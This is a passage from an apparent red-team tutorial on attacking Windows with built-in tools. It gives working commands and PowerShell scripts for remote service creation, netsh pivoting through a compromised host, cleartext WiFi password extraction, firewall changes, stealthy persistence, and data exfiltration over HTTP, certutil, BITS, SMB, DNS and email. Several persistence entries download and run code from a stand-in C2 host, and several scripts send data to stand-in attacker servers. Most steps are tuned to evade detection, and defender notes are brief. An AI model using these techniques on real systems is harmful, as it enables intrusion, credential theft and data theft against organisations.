<pre class="language-batch"><code class="language-batch">sc.exe \\TARGET-PC create UpdateService binPath= "C:\Windows\System32\cmd.exe /c start /b powershell.exe -Command \"Get-Process | Out-File C:\temp\processes.txt\"" start= demand
</code></pre>
<p>Or better yet, point the service at a legitimate Windows binary that can act as a service:</p>
<pre class="language-batch"><code class="language-batch"># Create service pointing to a payload you've copied to the target
sc.exe \\TARGET-PC create UpdateService binPath= "C:\Windows\Temp\payload.exe" start= demand
</code></pre>
<p>Service creation and modification are logged (Event ID 7045 for new services), and security-conscious organizations often monitor for suspicious service creation. Use service names that blend in with legitimate Windows services.</p>
<h3>Network Pivoting with netsh</h3>
<p>One of the most powerful but often overlooked native Windows tools for lateral movement is netsh.exe - the Network Shell utility. While administrators use it for configuring network settings, firewalls, and interfaces, it has capabilities that are incredibly useful for red teamers, particularly for network pivoting and credential harvesting.</p>
<p>Let me show you how to turn a compromised Windows system into a network pivot using only netsh.</p>
<h4>Port Forwarding and Pivoting</h4>
<p>The most valuable feature of netsh for offensive operations is port forwarding. If you've compromised a system that has access to internal networks you can't reach directly, you can use netsh to forward ports and pivot through that system.</p>
<p>Here's the basic concept: you configure the compromised system to listen on a port and forward all traffic to an internal target. This effectively turns the compromised system into a proxy, letting you access internal services that aren't directly reachable from your position.</p>
<pre class="language-powershell"><code class="language-powershell"># Set up port forwarding from compromised host to internal server
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.10.50

# Now you can access the internal web server at http://compromised-host:8080
# and it forwards to http://192.168.10.50:80
</code></pre>
<p>Let me break down this command. The <code>interface portproxy</code> context manages port forwarding in netsh, and <code>add v4tov4</code> adds an IPv4-to-IPv4 forwarding rule. The <code>listenport=8080</code> parameter sets the port to listen on (on the compromised system), while <code>listenaddress=0.0.0.0</code> makes it listen on all interfaces (or you can specify a specific IP). The <code>connectport=80</code> parameter defines the port to forward to on the target, and <code>connectaddress=192.168.10.50</code> specifies the internal IP address to forward traffic to.</p>
<p>This is incredibly powerful for several scenarios:</p>
<p><strong>Scenario 1: Accessing Internal Web Applications</strong></p>
<pre class="language-powershell"><code class="language-powershell"># Forward local port 8443 to internal HTTPS service
netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=internal-app.company.local
</code></pre>
<p>Now you can browse to <code>https://compromised-host:8443</code> and access the internal application.</p>
<p><strong>Scenario 2: Pivoting to Internal Databases</strong></p>
<pre class="language-powershell"><code class="language-powershell"># Forward to internal SQL Server
netsh interface portproxy add v4tov4 listenport=1433 listenaddress=0.0.0.0 connectport=1433 connectaddress=sql-server.internal.local

# Now connect with: sqlcmd -S compromised-host -U sa -P password
</code></pre>
<p><strong>Scenario 3: RDP Pivoting</strong></p>
<pre class="language-powershell"><code class="language-powershell"># Forward RDP to internal systems
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=admin-workstation.internal

# Connect via: mstsc /v:compromised-host:3389
</code></pre>
<p><strong>Scenario 4: SSH Tunneling to Internal Linux Systems</strong></p>
<pre class="language-powershell"><code class="language-powershell"># Forward to internal SSH server
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=linux-server.internal
</code></pre>
<p>To view all configured port forwards:</p>
<pre class="language-powershell"><code class="language-powershell"># List all port forwarding rules
netsh interface portproxy show all

# Or specifically show v4tov4 rules
netsh interface portproxy show v4tov4
</code></pre>
<p>To remove a forwarding rule when you're done:</p>
<pre class="language-powershell"><code class="language-powershell"># Delete specific rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Or delete all rules
netsh interface portproxy reset
</code></pre>
<p>The beautiful thing about netsh port forwarding is that it's completely native, requires no additional software, and persists across reboots. The forwarding rules are stored in the registry and automatically reinstated when the system restarts.</p>
<p>Important OPSEC note: Port forwarding creates network connections that can be monitored. The compromised system will show connections to the internal targets, and network monitoring might detect unusual traffic patterns. However, since netsh is a legitimate administrative tool and port forwarding is a normal network configuration task, it's less suspicious than running custom proxy tools.</p>
<h4>WiFi Credential Harvesting</h4>
<p>If you've compromised a laptop or any system with WiFi capability, netsh can extract saved WiFi credentials:</p>
<pre class="language-powershell"><code class="language-powershell"># List all saved WiFi profiles
netsh wlan show profiles

# Show detailed information including password for specific network
netsh wlan show profile name="CompanyWiFi" key=clear

# Export all WiFi profiles to XML files
netsh wlan export profile key=clear folder=C:\temp
</code></pre>
<p>The <code>key=clear</code> parameter is critical - it tells netsh to show the password in cleartext. Without it, you only see the encrypted version.</p>
<p>Here's what the output looks like:</p>
<pre class="language-none"><code class="language-none">Profile CompanyWiFi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : CompanyWiFi
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Security key           : Present
    Key Content            : P@ssw0rd123!
</code></pre>
<p>The WiFi password is right there in cleartext. This is particularly valuable because:</p>
<ol>
<li>WiFi passwords are often reused for other systems or services</li>
<li>The password might be the corporate WiFi password, which could be used for physical access operations</li>
<li>Personal hotspot passwords can reveal patterns about user password choices</li>
</ol>
<p>You can automate the extraction of all WiFi credentials:</p>
<pre class="language-powershell"><code class="language-powershell"># PowerShell script to extract all WiFi passwords
$profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(':')[1].Trim()
}

foreach ($profile in $profiles) {
    $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content"
    if ($password) {
        Write-Output "Network: $profile"
        Write-Output $password
        Write-Output "---"
    }
}
</code></pre>
<h4>Firewall Manipulation</h4>
<p>Netsh can also manipulate Windows Firewall, which is useful for opening ports or disabling protections:</p>
<pre class="language-powershell"><code class="language-powershell"># Disable Windows Firewall completely (very obvious)
netsh advfirewall set allprofiles state off

# Re-enable it
netsh advfirewall set allprofiles state on

# Add firewall rule to allow inbound connection
netsh advfirewall firewall add rule name="Allow Port 4444" dir=in action=allow protocol=TCP localport=4444

# Delete the rule when done
netsh advfirewall firewall delete rule name="Allow Port 4444"

# Show current firewall status
netsh advfirewall show allprofiles

# Export firewall configuration
netsh advfirewall export C:\temp\firewall-backup.wfw

# Import firewall configuration
netsh advfirewall import C:\temp\firewall-backup.wfw
</code></pre>
<p>Adding specific firewall rules is much stealthier than completely disabling the firewall. If you need to receive a reverse shell on port 4444, add a rule allowing that specific port rather than turning off the entire firewall.</p>
<h4>Network Interface Information</h4>
<p>Netsh can also enumerate network configuration, which is useful for understanding the network environment:</p>
<pre class="language-powershell"><code class="language-powershell"># Show all network interfaces and their configuration
netsh interface show interface

# Show IP configuration
netsh interface ip show config

# Show IP addresses
netsh interface ip show addresses

# Show routing table
netsh interface ip show route

# Show DNS servers
netsh interface ip show dnsservers
</code></pre>
<p>This information helps you understand the network topology and plan your lateral movement.</p>
<h4>Persistence via netsh</h4>
<p>You can use netsh to create persistent port forwards that survive reboots, effectively creating a backdoor for re-entry:</p>
<pre class="language-powershell"><code class="language-powershell"># Create persistent port forward to your C2 server
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=your-c2-server.com
</code></pre>
<p>Now any connection to this system on port 8080 gets forwarded to your C2 server on port 443. This could be used to maintain a communication channel or provide an alternative entry point.</p>
<h4>Combining netsh with Other Techniques</h4>
<p>Here's a practical example of using netsh for a complete network pivot scenario:</p>
<pre class="language-powershell"><code class="language-powershell"># Step 1: Set up port forward to internal system you want to access
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.50

# Step 2: Add firewall rule to allow the connection
netsh advfirewall firewall add rule name="Remote Desktop Relay" dir=in action=allow protocol=TCP localport=3389

# Step 3: From your attacker machine, RDP to the compromised host
# This actually connects you to 10.10.10.50 via the pivot

# Step 4: Clean up when done
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
netsh advfirewall firewall delete rule name="Remote Desktop Relay"
</code></pre>
<p>The reason netsh is so powerful for pivoting is that it's completely native to Windows, requires no additional tools, and performs a function that network administrators use legitimately. Unlike running a SOCKS proxy or custom tunneling tool, netsh port forwarding looks like normal network configuration.</p>
<p>From a detection perspective, defenders should monitor netsh commands with <code>portproxy</code> parameters, unexpected firewall rule additions, WiFi credential extraction (commands with <code>key=clear</code>), and netsh execution from unusual parent processes.</p>
<p>But in practice, netsh is used so frequently by administrators that distinguishing malicious use from legitimate use is challenging without behavioral analytics.</p>
<h2>Persistence Mechanisms</h2>
<p>After establishing lateral movement capabilities, you need persistence - the ability to maintain access even if your initial entry point is discovered and closed, if the system reboots, or if users log off.</p>
<p>Let me walk you through various persistence techniques using only native Windows tools. The key to effective persistence is choosing methods that blend in with legitimate system operations and are unlikely to be discovered during routine system administration.</p>
<h3>Registry Run Keys: The Classic</h3>
<p>Registry run keys are probably the most well-known persistence method, which means they're also one of the most monitored. But they're still effective when implemented carefully.</p>
<p>Run keys cause programs to execute when a user logs in. There are multiple run key locations in the registry, each with different scope and privilege requirements:</p>
<pre class="language-powershell"><code class="language-powershell"># Current user run key (doesn't require admin privileges)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveUpdate" -Value "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2-server.com/payload.ps1')" -PropertyType String -Force
</code></pre>
<p>This creates a registry value in the current user's run key. Every time this user logs in, the command executes. The command in this example downloads and executes a PowerShell script from your C2 server directly into memory without touching disk.</p>
<p>For system-wide persistence that affects all users:</p>
<pre class="language-powershell"><code class="language-powershell"># Local machine run key (requires admin privileges)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
</code></pre>
<p>The key to making run keys stealthy is choosing names and commands that look legitimate. "OneDriveUpdate" or "SecurityUpdate" are far less suspicious than "Backdoor" or "Payload".</p>
<p>There are also RunOnce keys, which execute once and then delete themselves:</p>
<pre class="language-powershell"><code class="language-powershell"># RunOnce key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "ConfigUpdate" -Value "powershell.exe -Command your_payload" -PropertyType String -Force
</code></pre>
<p>These might seem less useful, but they can be combined with your payload re-creating itself in another RunOnce key, creating a chain that's harder to trace.</p>
<p>Other useful run key locations:</p>
<pre class="language-powershell"><code class="language-powershell"># Run key locations (in order of visibility to users)
# HKLM - affects all users, requires admin, highly visible
HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce

# HKCU - current user only, doesn't require admin, less visible
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Explorer Run - executes when Explorer starts
HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

# RunServices keys (less commonly monitored)
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices
</code></pre>
<p>To check what's already in run keys (useful for blending in):</p>
<pre class="language-powershell"><code class="language-powershell"># List existing run key entries
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
</code></pre>
<h3>Startup Folder: Simple but Effective</h3>
<p>The Startup folder is even simpler than registry run keys - anything in this folder executes when the user logs in:</p>
<pre class="language-powershell"><code class="language-powershell"># Current user startup folder
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Create a shortcut to PowerShell
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("$startupPath\OneDrive.lnk")
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -NoProfile -Command your_payload"
$shortcut.WorkingDirectory = "C:\Windows\System32"
$shortcut.WindowStyle = 7  # Hidden
$shortcut.Description = "OneDrive Sync"
$shortcut.Save()
</code></pre>
<p>This creates a shortcut that looks like it's for OneDrive but actually executes your payload. The WindowStyle = 7 means the window is hidden.</p>
<p>For all users (requires admin):</p>
<pre class="language-powershell"><code class="language-powershell">$startupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Same shortcut creation code as above
</code></pre>
<p>Alternatively, you can directly place a script or batch file in the Startup folder:</p>
<pre class="language-powershell"><code class="language-powershell">$script = @"
@echo off
powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')
"@

Set-Content -Path "$startupPath\WindowsUpdate.bat" -Value $script
</code></pre>
<p>The advantage of Startup folder persistence is its simplicity. The disadvantage is that it's one of the first places defenders look when hunting for persistence.</p>
<h3>Scheduled Tasks: The Flexible Option</h3>
<p>Scheduled tasks are far more flexible than run keys because you can control exactly when and how often they execute:</p>
<pre class="language-powershell"><code class="language-powershell"># Create a scheduled task that runs at user logon
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -Command your_payload"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskUserCore" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
</code></pre>
<p>Let me explain the parameters. The <code>-AtLogOn</code> parameter triggers the task when any user logs on, while <code>-RunLevel Highest</code> runs it with elevated privileges if the user is an admin. The <code>-AllowStartIfOnBatteries</code> and <code>-DontStopIfGoingOnBatteries</code> flags ensure the task runs on laptops regardless of power state. Finally, <code>-Hidden</code> hides the task from the Task Scheduler GUI (though it's still visible from PowerShell or schtasks.exe).</p>
<p>The task name "MicrosoftEdgeUpdateTaskUserCore" is chosen to blend in - this is an actual Microsoft Edge update task name, so it won't raise suspicion.</p>
<p>For a task that runs periodically instead of at logon:</p>
<pre class="language-powershell"><code class="language-powershell"># Task that runs every 6 hours
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 6) -RepetitionDuration ([TimeSpan]::MaxValue)

Register-ScheduledTask -TaskName "WindowsBackupMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
</code></pre>
<p>Or a task that runs daily at a specific time:</p>
<pre class="language-powershell"><code class="language-powershell"># Task that runs every day at 3 AM
$trigger = New-ScheduledTaskTrigger -Daily -At 3am

Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
</code></pre>
<p>To make the task run as SYSTEM (requires admin):</p>
<pre class="language-powershell"><code class="language-powershell">$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "WindowsDefenderCache" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
</code></pre>
<p>Scheduled tasks are great for persistence because they're extremely flexible in scheduling, they can run with elevated privileges, thousands of legitimate scheduled tasks exist on typical Windows systems making yours blend in, and they persist across reboots and user logoffs without any additional configuration.</p>
<p>To list existing scheduled tasks and find good names to mimic:</p>
<pre class="language-powershell"><code class="language-powershell">Get-ScheduledTask | Where-Object {$_.TaskPath -like "*Microsoft*"} | Select-Object TaskName
</code></pre>
<h3>WMI Event Subscriptions: The Stealthy Approach</h3>
<p>WMI event subscriptions are one of the most sophisticated and stealthy persistence mechanisms. They're rarely monitored, difficult to detect, and incredibly powerful.</p>
<p>WMI event subscriptions consist of three components that work together. An event filter serves as the trigger, defining what event to watch for. An event consumer specifies the action to take when the event occurs. Finally, a binding connects the filter to the consumer, completing the subscription.</p>
<p>Here's a complete example:</p>
<pre class="language-powershell"><code class="language-powershell"># Step 1: Create an event filter (trigger)
$filterArgs = @{
    Name = "WindowsUpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# Step 2: Create an event consumer (action)
$consumerArgs = @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -Command your_payload"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Bind the filter to the consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
</code></pre>
<p>Let me explain what this does. The event filter watches for modifications to Win32_PerfFormattedData_PerfOS_System, which happens constantly as performance counters update. The <code>WITHIN 60</code> clause means it checks every 60 seconds. So effectively, this runs your payload every 60 seconds.</p>
<p>You can create different triggers for different purposes:</p>
<pre class="language-powershell"><code class="language-powershell"># Trigger when a specific process starts
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'outlook.exe'"

# Trigger at a specific time
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 14 AND TargetInstance.Minute = 30"

# Trigger when a user logs in
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
</code></pre>
<p>To view existing WMI event subscriptions (useful for cleanup or detection):</p>
<pre class="language-powershell"><code class="language-powershell"># List all event filters
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# List all event consumers
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer

# List all bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
</code></pre>
<p>To remove a WMI event subscription:</p>
<pre class="language-powershell"><code class="language-powershell">Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'WindowsUpdateFilter'} | Remove-WmiObject
</code></pre>
<p>WMI event subscriptions are powerful because they're not visible in Task Scheduler or obvious registry locations, most administrators don't know how to check for them, they can trigger based on complex system events, they persist across reboots, and they're rarely monitored by security tools.</p>
<p>The downside is they require administrator privileges to create.</p>
<h3>Winlogon Registry Keys</h3>
<p>Winlogon keys control what happens during the Windows login process. Certain keys execute programs during login:</p>
<pre class="language-powershell"><code class="language-powershell"># Userinit key - runs when users log in
$currentUserinit = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").Userinit
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$currentUserinit,powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
</code></pre>
<p>The default Userinit value is <code>C:\Windows\system32\userinit.exe,</code>. By appending our payload to this value, we maintain normal login functionality while also executing our payload.</p>
<p>Another Winlogon key is the Shell value:</p>
<pre class="language-powershell"><code class="language-powershell"># Shell key - defines the Windows shell
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe,powershell.exe -WindowStyle Hidden -Command your_payload" -PropertyType String -Force
</code></pre>
<p>The default Shell value is <code>explorer.exe</code>. By adding our payload, we execute it every time Explorer starts.</p>
<p>IMPORTANT: Be very careful with Winlogon keys. If you misconfigure them, you can break the login process or make the system unbootable. Always preserve the original values and append to them rather than replacing them.</p>
<p>Also note that Winlogon keys are well-known persistence locations and are typically monitored by security tools. Use them cautiously and only when other methods aren't suitable.</p>
<h2>Data Exfiltration</h2>
<p>Once you've established persistence, moved laterally, and collected the data you came for, you need to get it out of the target environment. Data exfiltration is often the most challenging phase because this is where you're moving potentially large amounts of data off the network, which can trigger network monitoring alerts if not done carefully.</p>
<p>Let me show you various techniques for exfiltrating data using only native Windows tools.</p>
<h3>PowerShell Web Requests</h3>
<p>PowerShell makes HTTP/HTTPS requests trivial, which means you can exfiltrate data to a web server you control:</p>
<pre class="language-powershell"><code class="language-powershell"># Upload a file via HTTP POST
$fileContent = [System.IO.File]::ReadAllBytes("C:\sensitive\data.txt")
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}

Invoke-RestMethod -Uri "http://your-exfil-server.com/upload" -Method POST -Headers $headers -Body $fileContent
</code></pre>
<p>This reads a file into memory and POSTs it to your exfiltration server. The web request looks like normal HTTP traffic, and if you use HTTPS, the content is encrypted in transit.</p>
<p>For larger files, you might want to chunk them:</p>
<pre class="language-powershell"><code class="language-powershell"># Upload file in chunks
$file = "C:\sensitive\large-file.zip"
$chunkSize = 1MB
$buffer = New-Object byte[] $chunkSize
$fileStream = [System.IO.File]::OpenRead($file)

$chunkNumber = 0
while (($bytesRead = $fileStream.Read($buffer, 0, $chunkSize)) -gt 0) {
    $chunkNumber++
    $chunkData = $buffer[0..($bytesRead-1)]
    Invoke-RestMethod -Uri "http://your-server.com/upload?chunk=$chunkNumber" -Method POST -Body $chunkData
}
$fileStream.Close()
</code></pre>
<p>This reads the file in 1MB chunks and uploads each chunk separately. On your exfiltration server, you'd reassemble the chunks.</p>
<p>For HTTPS with self-signed certificates (common for C2 servers), you need to bypass certificate validation:</p>
<pre class="language-powershell"><code class="language-powershell"># Bypass SSL certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Now HTTPS requests will work with self-signed certs
Invoke-RestMethod -Uri "https://your-server.com/upload" -Method POST -Body $data
</code></pre>
<h3>Certutil: The Unexpected File Transfer Tool</h3>
<blockquote>
<p><strong>üö® EDR REALITY CHECK (2025):</strong> Certutil for file downloads/uploads is <strong>heavily monitored</strong> and will be flagged even by Windows Defender in many configurations. The <code>-urlcache</code> switch for downloading files is a well-known indicator of compromise. Modern EDRs have specific signatures for certutil being used for non-certificate operations. This technique was stealthy years ago but is now one of the first things blue teams look for. Consider alternative download methods (PowerShell with obfuscation, compiled binaries, or legitimate admin tools like bits transfer) for modern engagements.</p>
</blockquote>
<p>Certutil is a built-in Windows utility for managing certificates, but it has a lesser-known feature for downloading files:</p>
<pre class="language-batch"><code class="language-batch">certutil.exe -urlcache -split -f http://your-server.com/upload C:\temp\upload.txt
</code></pre>
<p>The <code>-urlcache</code> flag uses the URL cache, <code>-split</code> writes the file to disk, and <code>-f</code> forces overwriting existing files.</p>
<p>But certutil can also be used for uploads if your server supports it. The trick is encoding the file as base64 and sending it as part of a URL:</p>
<pre class="language-powershell"><code class="language-powershell"># Encode file as base64
$fileContent = [System.IO.File]::ReadAllBytes("C:\sensitive\data.txt")
$base64 = [Convert]::ToBase64String($fileContent)

# Split into chunks (URLs have length limits)
$chunkSize = 8000
for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
    $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
    certutil.exe -urlcache -split -f "http://your-server.com/receive?data=$chunk" null
}
</code></pre>
<p>Your server would collect these chunks and reassemble the base64-encoded file.</p>
<p>After using certutil, clean the URL cache:</p>
<pre class="language-batch"><code class="language-batch">certutil.exe -urlcache * delete
</code></pre>
<h3>BITS: Background Intelligent Transfer Service</h3>
<p>BITS is designed for transferring large files in the background, which makes it perfect for stealthy exfiltration:</p>
<pre class="language-batch"><code class="language-batch"># Create a BITS job for upload
bitsadmin /create ExfilJob
bitsadmin /addfile ExfilJob C:\sensitive\data.zip http://your-server.com/upload/data.zip
bitsadmin /setpriority ExfilJob FOREGROUND
bitsadmin /resume ExfilJob
</code></pre>
<p>BITS transfers are resumable, which means if the connection is interrupted, the transfer will automatically resume when connectivity is restored. They also throttle themselves to avoid saturating the network connection, which helps avoid detection by network monitoring tools.</p>
<p>To monitor the transfer:</p>
<pre class="language-batch"><code class="language-batch">bitsadmin /monitor
</code></pre>
<p>Once complete, remove the job:</p>
<pre class="language-batch"><code class="language-batch">bitsadmin /complete ExfilJob
</code></pre>
<p>BITS can also download files:</p>
<pre class="language-batch"><code class="language-batch">bitsadmin /transfer DownloadJob /download /priority HIGH http://your-server.com/file.zip C:\temp\file.zip
</code></pre>
<p>The advantage of BITS is that it's a Microsoft service designed for network transfers, so BITS traffic looks completely legitimate. Windows Update uses BITS, so there's always some BITS traffic on corporate networks.</p>
<h3>SMB-Based Exfiltration</h3>
<p>If your exfiltration server is reachable via SMB (port 445), you can simply copy files:</p>
<pre class="language-powershell"><code class="language-powershell"># Map a drive to your server
net use Z: \\your-exfil-server\share /user:username password

# Copy files
Copy-Item C:\sensitive\data.zip Z:\

# Disconnect
net use Z: /delete
</code></pre>
<p>Or without mapping a drive:</p>
<pre class="language-powershell"><code class="language-powershell">Copy-Item C:\sensitive\data.zip \\your-exfil-server\share\
</code></pre>
<p>SMB is encrypted (SMBv3) and looks like normal file sharing traffic. If your exfiltration server is on the same network or reachable via VPN, this is one of the stealthiest methods.</p>
<h3>DNS Exfiltration</h3>
<p>DNS exfiltration is slower but very stealthy because DNS traffic is rarely inspected and almost never blocked:</p>
<pre class="language-powershell"><code class="language-powershell"># Read the file to exfiltrate
$data = [System.IO.File]::ReadAllBytes("C:\sensitive\passwords.txt")
$encoded = [Convert]::ToBase64String($data)

# DNS labels max out at 63 characters, domains at 253
$chunkSize = 32  # Conservative chunk size
$domain = "exfil.yourdomain.com"

for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
    $subdomain = "$chunk.$domain"

    # Make DNS query
    nslookup $subdomain 2>$null | Out-Null

    # Small delay to avoid overwhelming DNS
    Start-Sleep -Milliseconds 100
}
</code></pre>
<p>On your DNS server (which could be an authoritative DNS server for your domain or a server logging DNS queries), you'd capture these queries and reconstruct the base64-encoded data.</p>
<p>This is slow - DNS queries have significant overhead - but it's extremely stealthy. Every system makes constant DNS queries, so your exfiltration blends in perfectly.</p>
<p>For more sophisticated DNS exfiltration, you can include sequence numbers and error correction:</p>
<pre class="language-powershell"><code class="language-powershell">$sequenceNumber = 0
for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
    $subdomain = "seq$sequenceNumber.$chunk.$domain"
    nslookup $subdomain 2>$null | Out-Null
    $sequenceNumber++
    Start-Sleep -Milliseconds 100
}

# Send end marker
nslookup "end.$domain" 2>$null | Out-Null
</code></pre>
<p>This way, if any packets are lost, you can identify which chunks are missing and request them again.</p>
<h3>ICMP Exfiltration</h3>
<p>ICMP (ping) packets can carry data in their payload. While PowerShell's Test-Connection doesn't let you specify custom data, you can use other approaches:</p>
<pre class="language-powershell"><code class="language-powershell"># This is more limited but possible with some creativity
# Encode data in the target hostname for ping
$data = "sensitive_data_here"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))

# Use ping to your server (data in hostname)
ping -n 1 "$encoded.your-exfil-server.com"
</code></pre>
<p>This puts the data in the DNS query that ping makes to resolve the hostname, so it's really DNS exfiltration disguised as ping.</p>
<p>True ICMP payload exfiltration requires lower-level packet crafting that's difficult with only native tools.</p>
<h3>Email-Based Exfiltration</h3>
<p>If the compromised system has email configured (Exchange, SMTP, or Outlook), you can exfiltrate via email:</p>
<pre class="language-powershell"><code class="language-powershell"># Send email with attachment using Send-MailMessage
$smtp = "smtp.company.com"
$from = "compromised-user@company.com"
$to = "exfil@your-domain.com"
$subject = "Weekly Report"
$body = "Please see the attached report."

Send-MailMessage -From $from -To $to -Subject $subject -Body $body -Attachments "C:\sensitive\data.zip" -SmtpServer $smtp
</code></pre>
<p>This only works if the system can send email without authentication (internal mail relay) or if you have email credentials.</p>
<p>A more sophisticated approach uses Outlook COM automation:</p>
<pre class="language-powershell"><code class="language-powershell"># Use Outlook to send email
$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)  # 0 = MailItem

$mail.To = "exfil@your-domain.com"
$mail.Subject = "Monthly Report"
$mail.Body = "See attachment."
$mail.Attachments.Add("C:\sensitive\data.zip")
$mail.Send()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
</code></pre>
<p>This uses the victim's Outlook to send email, which means it appears to come from a legitimate user and uses their email credentials automatically.</p>
<h2>Bypassing Application Whitelisting</h2>
<p>Application whitelisting is one of the most effective security controls organizations can implement. Tools like AppLocker, Windows Defender Application Control (WDAC), and third-party solutions aim to prevent unauthorized code execution by only allowing approved executables to run. In theory, this should stop attackers dead in their tracks - no custom tools, no malware, no code execution.</p>
